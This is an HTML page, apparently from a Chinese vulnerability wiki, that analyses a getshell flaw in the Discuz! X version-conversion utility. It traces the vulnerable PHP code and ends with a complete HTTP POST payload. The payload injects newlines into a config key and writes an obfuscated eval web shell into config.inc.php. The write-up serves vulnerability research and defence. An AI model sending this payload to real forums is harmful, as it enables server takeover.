@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E7%89%88%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4Getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz! X 系列全版本，版本转换功能导致Getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz! X \u7cfb\u5217\u5168\u7248\u672c\uff0c\u7248\u672c\u8f6c\u6362\u529f\u80fd\u5bfc\u81f4Getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X3.1 后台任意代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X 系列全版本 后台Sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuz-x-getshell">Discuz! X 系列全版本，版本转换功能导致Getshell<a class="headerlink" href="#discuz-x-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>存在问题的代码在<code>/utility/convert/</code>目录下，这部分的功能主要是用于Dz系列产品升级/转换。</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Discuz! X 全版本</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>入口<code>utility/convert/index.php</code></p>
+<div class="codehilite"><pre><span></span><code><span class="nv">require</span><span class="w"> </span><span class="s1">&#39;./include/common.inc.php&#39;</span><span class="c1">;</span>
+
+<span class="mh">$ac</span><span class="nv">tion</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">getgpc</span><span class="ss">(</span><span class="s1">&#39;a&#39;</span><span class="ss">)</span><span class="c1">;</span>
+<span class="mh">$ac</span><span class="nv">tion</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">empty</span><span class="ss">(</span><span class="mh">$ac</span><span class="nv">tion</span><span class="ss">)</span><span class="w"> </span>?<span class="w"> </span><span class="nv">getgpc</span><span class="ss">(</span><span class="s1">&#39;action&#39;</span><span class="ss">)</span><span class="w"> </span>:<span class="w"> </span><span class="mh">$ac</span><span class="nv">tion</span><span class="c1">;</span>
+$<span class="nv">source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">getgpc</span><span class="ss">(</span><span class="s1">&#39;source&#39;</span><span class="ss">)</span><span class="w"> </span>?<span class="w"> </span><span class="nv">getgpc</span><span class="ss">(</span><span class="s1">&#39;source&#39;</span><span class="ss">)</span><span class="w"> </span>:<span class="w"> </span><span class="nv">getgpc</span><span class="ss">(</span><span class="s1">&#39;s&#39;</span><span class="ss">)</span><span class="c1">;</span>
+</code></pre></div>
+
+<p>取<code>$_POST['a']</code>,直接赋值给<code>$action</code>，此时<code>$action = config</code>;</p>
+<div class="codehilite"><pre><span></span><code>} elseif($action == &#39;config&#39; || CONFIG_EMPTY) {      
+    require DISCUZ_ROOT.&#39;./include/do_config.inc.php&#39;;  
+} elseif($action == &#39;setting&#39;) {
+</code></pre></div>
+
+<p>满足条件，引入<code>./include/do_config.inc.php</code></p>
+<div class="codehilite"><pre><span></span><code><span class="nv">@touch</span><span class="p">(</span><span class="err">$</span><span class="n">configfile</span><span class="p">);</span>
+<span class="w"> </span><span class="p">......</span>
+<span class="k">if</span><span class="p">(</span><span class="n">submitcheck</span><span class="p">())</span><span class="w"> </span><span class="err">{</span>
+<span class="w">    </span><span class="err">$</span><span class="n">newconfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getgpc</span><span class="p">(</span><span class="s1">&#39;newconfig&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">newconfig</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="err">$</span><span class="n">checkarray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">setting</span><span class="o">[</span><span class="n">&#39;config&#39;</span><span class="o">][</span><span class="n">&#39;ucenter&#39;</span><span class="o">]</span><span class="w"> </span><span class="vm">?</span><span class="w"> </span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;source&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;target&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;ucenter&#39;</span><span class="p">)</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;source&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;target&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">checkarray</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="err">$</span><span class="k">key</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">      </span><span class="p">......</span>
+<span class="w">    </span><span class="err">}</span>
+<span class="w">    </span><span class="n">save_config_file</span><span class="p">(</span><span class="err">$</span><span class="n">configfile</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">newconfig</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">config_default</span><span class="p">);</span>
+</code></pre></div>
+
+<p><code>$newconfig</code>从<code>$_POST[newconfig]</code>获取数据，<code>save_config_file</code>函数保将<code>$newconfig</code>保存到<code>$configfile</code>文件中，即<code>config.inc.php</code>文件。跟进该函数。</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">save_config_file</span><span class="p">(</span><span class="nx">$filename</span><span class="p">,</span><span class="w"> </span><span class="nx">$config</span><span class="p">,</span><span class="w"> </span><span class="nx">$default</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">$config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">setdefault</span><span class="p">(</span><span class="nx">$config</span><span class="p">,</span><span class="w"> </span><span class="nx">$default</span><span class="p">);</span><span class="c1">// 将$config中的空白项用 $default 中对应项的值填充</span>
+<span class="w">    </span><span class="nx">$date</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gmdate</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">time</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">3600</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">8</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">$year</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">$content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="nx">EOT</span>
+<span class="cp">&lt;?php</span>
+
+
+<span class="nx">\</span><span class="nv">$_config</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+
+<span class="nx">EOT</span><span class="p">;</span>
+    <span class="nv">$content</span> <span class="o">.=</span> <span class="nx">getvars</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;_config&#39;</span> <span class="o">=&gt;</span> <span class="nv">$config</span><span class="p">));</span>
+    <span class="nv">$content</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">// &quot;</span><span class="o">.</span><span class="nb">str_pad</span><span class="p">(</span><span class="s1">&#39;  THE END  &#39;</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="nx">STR_PAD_BOTH</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; //</span><span class="se">\r\n\r\n</span><span class="s2">?&gt;&quot;</span><span class="p">;</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>getvars函数处理，此时的<code>$config</code> =
+<code>$newconfig+config.default.php对应项的补充</code>。看一下getvars函数：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">function</span><span class="w"> </span><span class="n">getvars</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;VAR&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="o">$</span><span class="n">evaluate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">key</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">$</span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">preg_match</span><span class="p">(</span><span class="s2">&quot;/^[a-zA-Z_</span><span class="se">\x7f</span><span class="s2">-</span><span class="se">\xff</span><span class="s2">][a-zA-Z0-9_</span><span class="se">\x7f</span><span class="s2">-</span><span class="se">\xff</span><span class="s2">]*$/&quot;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">key</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="o">$</span><span class="n">val</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">evaluate</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="n">buildarray</span><span class="p">(</span><span class="o">$</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;\${$key}&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addcslashes</span><span class="p">(</span><span class="o">$</span><span class="n">val</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;</span><span class="se">\&#39;\\</span><span class="s1">&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="o">$</span><span class="n">evaluate</span><span class="w"> </span><span class="o">.=</span><span class="w"> </span><span class="o">$</span><span class="n">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;VAR&#39;</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="s2">&quot;\$$key = &#39;$val&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;define(&#39;&quot;</span><span class="o">.</span><span class="n">strtoupper</span><span class="p">(</span><span class="o">$</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;, &#39;$val&#39;);</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">evaluate</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>满足if条件会执行<code>buildarray</code>函数，此时<code>$key=_config</code>，<code>$val</code>=上面的<code>$config</code>。最终造成写入的在该函数中（update.php
+2206行）：</p>
+<div class="codehilite"><pre><span></span><code>foreach ($array as $key =&gt; $val) {
+        if($level == 0) {
+            //str_pad — 使用另一个字符串填充字符串为指定长度
+            // 第一个参数是要输出的字符串，指定长度为50，用&#39;-&#39;填充，居中
+            $newline = str_pad(&#39;  CONFIG &#39;.strtoupper($key).&#39;  &#39;, 50, &#39;-&#39;, STR_PAD_BOTH);
+            $return .= &quot;\r\n// $newline //\r\n&quot;;
+        }
+</code></pre></div>
+
+<p>本意是使用<code>$config</code>数组的key作为每一块配置区域的\"注释标题\"，写入配置文件的$newline依赖于$key，而$key是攻击者可控的。</p>
+<p>未对输入数据进行正确的边界处理，导致可以插入换行符，逃离注释的作用范围，从而使输入数据转化为可执行代码。</p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>在产品升级/转换-&gt;选择产品转换程序 -&gt;设置服务器信息 这里抓包，</p>
+<p>payload：</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/dz/utility/convert/index.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">www.0-sec.org:8001</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">278</span>
+<span class="na">Origin</span><span class="o">:</span> <span class="l">http://127.0.0.1:8001</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1:8001/dz/utility/convert/index.php</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+<span class="nt">a</span><span class="o">=</span><span class="s">config</span><span class="p">&amp;</span><span class="nt">source</span><span class="o">=</span><span class="s">d7.2_x1.5</span><span class="p">&amp;</span><span class="nt">submit</span><span class="o">=</span><span class="s">yes</span><span class="p">&amp;</span><span class="nt">newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(108).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]</span><span class="o">=</span><span class="s">aaaa</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Discuz%21X%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%E7%89%88%E6%9C%AC%E8%BD%AC%E6%8D%A2%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4Getshell/media/rId26.png" /></p>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7492">https://xz.aliyun.com/t/7492</a>#toc-18</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.1%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X3.1 后台任意代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X%20%E7%B3%BB%E5%88%97%E5%85%A8%E7%89%88%E6%9C%AC%20%E5%90%8E%E5%8F%B0Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X 系列全版本 后台Sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
